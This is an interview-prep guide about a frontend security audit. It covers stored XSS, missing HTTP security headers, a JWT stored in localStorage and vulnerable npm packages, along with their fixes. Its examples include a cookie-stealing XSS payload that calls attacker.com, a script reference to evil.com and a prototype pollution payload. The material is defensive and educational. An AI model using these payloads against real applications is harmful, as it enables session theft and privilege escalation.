# What the Vulnerabilities Were — Common Types in Enterprise Frontend
> Part 23 — SAP BI Launchpad Project Deep Dive · Module 23.3: The Security Story
> Full Stack Interview Guide · Hruday D · 2026

---

## ⚡ 60-Second Revision Card
> Read this the night before an interview. Nothing else needed.

- **47 vulnerabilities found across four categories**: (1) XSS from user-controlled content rendered without sanitisation; (2) missing HTTP security headers — no CSP, no HSTS, no X-Frame-Options; (3) JWT stored in localStorage, accessible to any JavaScript on the page; (4) 23 npm packages with known CVEs, 4 of them critical severity
- **The XSS was the most dangerous**: report names created by BI analysts were stored and displayed back in other users' dashboards without sanitisation — classic stored XSS; an attacker with a valid analyst account could inject JavaScript into report names and steal all other analysts' session tokens
- **LocalStorage JWT was the second most dangerous**: if any script on the page (e.g. a compromised vendor script via CDN) ran, it could `localStorage.getItem('jwt')` and exfiltrate the token to an attacker's server; the fix was httpOnly cookies — JavaScript cannot read them at all
- **Missing CSP meant no second line of defence**: even if the XSS payload ran, a CSP would have blocked the script from calling out to `attacker.com`; without CSP, the XSS had full network access
- **The audit number (47 vs 9)**: 47 vulnerabilities before, 9 after; the remaining 9 were infrastructure-level (TLS configuration on the reverse proxy, OS-level CVEs) — outside the frontend team's scope; key to say this clearly so the interviewer doesn't think you only got 80% done
- **How you found them**: internal security audit (SAST tool, npm audit), external penetration test (the stored XSS was found by the pen tester), and OWASP ZAP for automated scanning

---

## 1. One-Line Definition
The 47 frontend vulnerabilities fell into four categories: stored XSS from unsanitised report names, missing HTTP security headers, JWT tokens stored in localStorage instead of httpOnly cookies, and npm packages with known CVEs.

---

## 2. The Four Vulnerability Categories — Be Specific

### Category 1 — Stored XSS (Highest Severity)

```
HOW IT WORKED:

A BI analyst creates a report and names it:
  <script>fetch('https://attacker.com/steal?t='+document.cookie)</script>

API stores the name verbatim in the database.

Another analyst opens their dashboard.
Backend returns the report list including the malicious name.
Shell renders: <div className={styles.title}>{report.name}</div>
React's dangerouslySetInnerHTML is NOT used here — this wouldn't work in JSX.

BUT: one component was rendering using innerHTML directly:
  reportThumbnail.innerHTML = report.name;  // ← direct DOM mutation, bypasses React
  
Browser parses the report name as HTML. Script executes.
The script reads document.cookie and sends it to attacker.com.

WHAT WAS AT RISK:
  Session cookies of all analysts who viewed the dashboard
  From one compromised account, full session hijacking of all users
  All reports, all analytics data accessible

SEVERITY: Critical (CVSS 9.8)
```

### Category 2 — Missing HTTP Security Headers

```
HEADERS THAT WERE ABSENT:

Content-Security-Policy (CSP):
  Never set. Means the browser has NO restrictions on what scripts can run.
  This amplified the XSS: the injected script could call any external URL.
  Without CSP: <script src="https://evil.com/steal.js"> would run.
  With CSP:    script-src 'self' → blocked immediately.

HSTS (HTTP Strict Transport Security):
  Never set. Means the browser doesn't enforce HTTPS.
  On a corporate network with a man-in-the-middle proxy, HTTP fallback is possible.
  With HSTS: browser refuses to connect over HTTP for the next 2 years (max-age).

X-Frame-Options: DENY (or frame-ancestors 'none' in CSP):
  Never set. The application could be embedded in an iframe on attacker.com.
  The attacker overlays invisible buttons on top of the real UI.
  User thinks they're using the real app. They're clicking the attacker's invisible layer.
  This attack = clickjacking.

X-Content-Type-Options: nosniff:
  Never set. Browser could be tricked into interpreting a JSON response as JavaScript.

Referrer-Policy: strict-origin-when-cross-origin:
  Never set. Full URL (including report IDs in query params) sent to third-party servers
  in the Referer header on any external link click.
```

### Category 3 — JWT in localStorage

```
CODE THAT WAS THERE:
// After OAuth login
localStorage.setItem('jwt', token);  // ← accessible to ALL JavaScript on the page

// On every API request
const jwt = localStorage.getItem('jwt');
fetch('/api/reports', { headers: { Authorization: `Bearer ${jwt}` } });

WHY THIS IS DANGEROUS:
  Any JavaScript that runs on the page can read localStorage.
  Third-party analytics scripts, ad scripts, CDN-hosted vendor scripts.
  A compromised vendor script: localStorage.getItem('jwt') → send to attacker.
  localStorage persists across page reloads AND tabs in the same origin.
  If a user is infected with malware that injects scripts, all tokens are exposed.

WHAT SHOULD HAVE BEEN USED:
  httpOnly cookies — set by the server, readable by the browser, invisible to JavaScript.
  JavaScript cannot call document.cookie for httpOnly cookies.
  Even if an XSS payload runs, it cannot read the auth token.
  Combined with SameSite=Strict: immune to CSRF as well.
```

### Category 4 — npm Packages with Known CVEs

```
HOW npm audit SHOWED THE RISK:

$ npm audit
  23 vulnerabilities found
  4 critical, 12 high, 7 moderate

EXAMPLES:
  lodash 4.17.11 → Prototype pollution (CVE-2019-10744, CVSS 9.8) — in prod dependencies
  moment 2.24.0 → ReDoS vulnerability (regex denial of service on malformed input)
  json-schema 0.2.3 → Prototype pollution (CVSS 9.8) — transitive dependency

THE RISK:
  Prototype pollution means an attacker can inject properties into Object.prototype.
  Code like: if (user.isAdmin) runs as TRUE for any user.
  This was in a direct dependency used for request validation.

THE FIX:
  npm audit --fix for auto-fixable CVEs
  Manual upgrade for breaking-change CVEs (lodash 4.17.x → 4.17.21)
  npm audit added to CI pipeline: builds fail on any new critical CVE
```

---

## 3. How You Found Them

```
DISCOVERY METHODS (mention all three for completeness)

1. Internal SAST scan (Static Application Security Testing)
   Tool: Semgrep with OWASP ruleset
   Found: missing security headers, localStorage token storage, innerHTML usage
   Automated, runs on every commit, zero manual effort once configured

2. External Penetration Test
   Third-party security team engaged by SAP security org
   Found: the stored XSS (SAST missed it because the payload went through the API)
   Found: CSP bypass opportunities
   This is how the critical severity count came from 20 to 47

3. npm audit
   Built into npm, zero setup
   Found: all 23 package CVEs
   Added to CI pipeline: blocks builds with critical CVEs

4. OWASP ZAP (automated scanner)
   Runs in CI against the deployed staging environment
   Found: missing headers (corroborated SAST findings)
   Runs after every deployment, not just in local audit
```

---

## 4. Interview Questions & Model Answers

### Q1 — Warm Up
**Interviewer asks:** "You mentioned reducing vulnerabilities by 80%. What were they?"

**Hruday's answer:**
> "They fell into four categories. First, stored XSS — report names created by analysts were stored in the database and rendered in other users' dashboards. One component was using `innerHTML` directly to render the name, which meant an analyst could craft a report name containing a script tag that would execute in every other user's browser. The pen tester found this by creating a report with a `<script>fetch(...)` name. Second, missing HTTP security headers — no CSP, no HSTS, no X-Frame-Options. The CSP absence meant the XSS had no second layer stopping it from calling external URLs. Third, JWT tokens stored in localStorage — any JavaScript on the page, including third-party vendor scripts, can read localStorage. The fix was httpOnly cookies — JavaScript physically cannot read them. Fourth, 23 npm packages with known CVEs — 4 of them critical severity, including a prototype pollution in a validation library that could allow privilege escalation. After fixing all four categories we had 9 vulnerabilities remaining — all infrastructure-level, outside the frontend team's scope."

---

### Q2 — Deep Dive
**Interviewer asks:** "How does prototype pollution work and why is it dangerous?"

**Hruday's answer:**
> "JavaScript objects inherit from `Object.prototype`. Prototype pollution means an attacker can add or change properties on that global prototype. If a vulnerable library processes user-controlled JSON like `{ '__proto__': { 'isAdmin': true } }`, it can set `Object.prototype.isAdmin = true`. Now every object in the application has `isAdmin: true` as an inherited property. Code that checks `if (user.isAdmin) { showAdminPanel() }` now evaluates as true for all users, because the check climbs the prototype chain and finds the polluted value. In our case, the lodash version we were using had a known prototype pollution CVE. A user could send a crafted request body that polluted the prototype, potentially bypassing role checks in the frontend. The fix was upgrading lodash to 4.17.21, which patches the vulnerable merge function. We also added `npm audit` to CI so new critical CVEs block the build."

---

## 5. The Traps

| Trap | What most candidates say | What Hruday says |
|------|--------------------------|------------------|
| Vague on the 80% | "We fixed security issues" | "47 vulnerabilities before, 9 after; 38 fixed; remaining 9 are infra-level, outside frontend scope" |
| Can't name the XSS variant | "We had an XSS issue" | "Stored XSS — malicious script injected in a report name, stored in the DB, executes in every user's dashboard who views it" |
| localStorage is 'fine' | "We use localStorage for the JWT" | "localStorage is accessible to all page scripts; httpOnly cookies are the correct approach — JavaScript cannot read them" |
| Forget CSP as a second layer | Describe XSS fix without CSP | "CSP is the second line of defence — even if XSS runs, CSP blocks the script from calling external URLs" |

---

## 6. Hruday's Real Experience Hook

> "The stored XSS discovery by the pen tester was the wake-up call. I had reviewed that component and missed the `innerHTML` assignment — it was in a legacy part of the codebase that nobody had touched in a year. The penetration test report made it impossible to miss. From that point, I added DOMPurify sanitisation to every component that rendered user-generated content, and added an ESLint rule that flags any `innerHTML` assignment. That ESLint rule has caught three more potential XSS vectors in PRs from other engineers since then."

---

## 7. Scale Evolution

**1,000 users →** All four fixes above. Pen test once per year minimum.

**100,000 users →** Bug bounty programme — let external researchers find what internal teams miss. SAST in every PR gate. Dependency bot auto-PRs for CVE fixes.

**10 million users →** Web Application Firewall (WAF) at the CDN layer as a first line of defence. Runtime application self-protection (RASP) for backend. Red team exercises twice per year. SOC monitoring for anomalous API call patterns that indicate credential theft.

---

## 8. Company Relevance

| Company | Why this matters here | Interview signal |
|---------|----------------------|-----------------|
| Razorpay / PhonePe | Financial data; regulatory compliance; a breach is a headline event | Stored XSS in payment UI = session token theft = fraudulent transactions |
| Swiggy / Meesho | User-generated content (reviews, listings) → XSS attack surface | DOMPurify for all UGC; `innerHTML` ESLint ban |
| Adobe / Microsoft | Enterprise trust model; customers read security advisories before procurement | CSP report-only mode → enforcement; npm audit CI gate; pen test cycle |
| SAP Labs | You did this audit — you own the 47 → 9 number, the XSS root cause, the ESLint fix | Credible and specific: "stored XSS in a legacy component using innerHTML; found by external pen tester" |

---

*Part 23 · What the Vulnerabilities Were — Common Types in Enterprise Frontend · Full Stack Interview Guide · Hruday D · 2026*
